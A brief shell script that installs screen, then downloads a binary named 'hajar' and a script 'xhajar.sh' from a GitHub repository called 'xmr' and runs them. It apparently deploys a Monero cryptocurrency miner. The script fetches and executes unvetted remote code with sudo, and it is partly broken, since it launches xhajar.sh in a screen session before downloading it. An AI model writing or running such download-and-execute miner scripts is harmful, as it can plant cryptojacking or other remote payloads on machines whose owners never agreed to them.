#!/bin/sh

sudo apt update

sudo apt install screen -y

screen -dmS xhajar.sh ./xhajar.sh 65 75

wget https://github.com/renilo/xmr/raw/main/hajar

wget https://raw.githubusercontent.com/renilo/xmr/main/xhajar.sh

chmod +x xhajar.sh

./xhajar.sh
